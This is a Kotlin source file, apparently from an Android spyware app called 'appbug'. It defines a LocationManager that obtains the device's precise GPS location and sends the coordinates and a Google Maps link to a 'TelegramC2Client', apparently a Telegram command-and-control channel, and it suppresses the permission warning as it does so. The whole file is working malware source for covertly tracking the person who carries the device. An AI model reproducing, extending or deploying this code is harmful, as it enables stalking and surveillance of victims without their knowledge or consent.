package com.mzkyzak.appbug

import android.annotation.SuppressLint
import android.content.Context
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority

class LocationManager(private val context: Context, private val c2Client: TelegramC2Client) {
    private val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)

    @SuppressLint("MissingPermission")
    fun reportLocation() {
        fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
            .addOnSuccessListener { location ->
                if (location != null) {
                    c2Client.sendLocation(location.latitude, location.longitude)
                    val message = "<b>[Location]</b>\nLat: ${location.latitude}\nLong: ${location.longitude}\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
                    c2Client.sendMessage(message)
                } else {
                    c2Client.sendMessage("<b>[Location]</b> Error: Location is null")
                }
            }
            .addOnFailureListener { e ->
                c2Client.sendMessage("<b>[Location]</b> Error: ${e.message}")
            }
    }
}
